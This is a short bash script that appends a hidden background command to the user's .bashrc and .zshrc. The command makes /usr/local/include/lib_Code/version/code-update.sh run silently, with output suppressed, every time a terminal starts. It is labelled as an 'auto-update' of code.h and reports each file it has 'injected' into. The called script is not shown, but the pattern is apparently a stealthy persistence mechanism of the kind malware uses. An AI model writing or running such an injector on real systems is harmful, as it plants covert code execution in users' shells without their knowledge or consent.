#!/bin/bash

# Target line to add
UPDATER_CMD="bash /usr/local/include/lib_Code/version/code-update.sh >/dev/null 2>&1 &"

# Files to target
FILES=("$HOME/.bashrc" "$HOME/.zshrc")

for file in "${FILES[@]}"; do
    if [ -f "$file" ] && ! grep -Fq "$UPDATER_CMD" "$file"; then
        echo -e "\n# Auto-update code.h on terminal start" >> "$file"
        echo "$UPDATER_CMD" >> "$file"
        echo "Injected into: $file"
    fi
done
